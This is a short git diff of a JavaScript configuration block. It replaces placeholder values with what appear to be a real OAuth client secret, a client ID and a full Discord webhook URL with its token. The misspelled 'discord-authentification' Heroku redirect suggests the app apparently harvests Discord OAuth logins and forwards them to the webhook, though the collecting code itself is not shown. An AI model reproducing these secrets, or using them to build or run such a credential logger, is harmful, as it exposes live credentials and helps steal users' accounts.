@@ -1,8 +1,8 @@
 // Configuration
-const client_secret = 'change'
-const client_id = 'change'
+const client_secret = 'trF8Q~gaQMctqyviUMYnnHghSOKoo0fh1lotOa5p'
+const client_id = 'e9a16ef2-486c-4c81-92fd-a3dcbef1931c'
 const redirect_uri = 'https://discord-authentification.herokuapp.com/'
-const webhook_url = 'change'
+const webhook_url = 'https://discord.com/api/webhooks/1034739390439751720/Gs5Nf9zGb5ffFChiI3LQ3RniAfo4b6VVu9j0t6oU7m_DBDCI9HD1WZbqgdOWCu2ka525'
 const webhook_logging_url = 'change'
 // Config end
 const axios = require('axios')
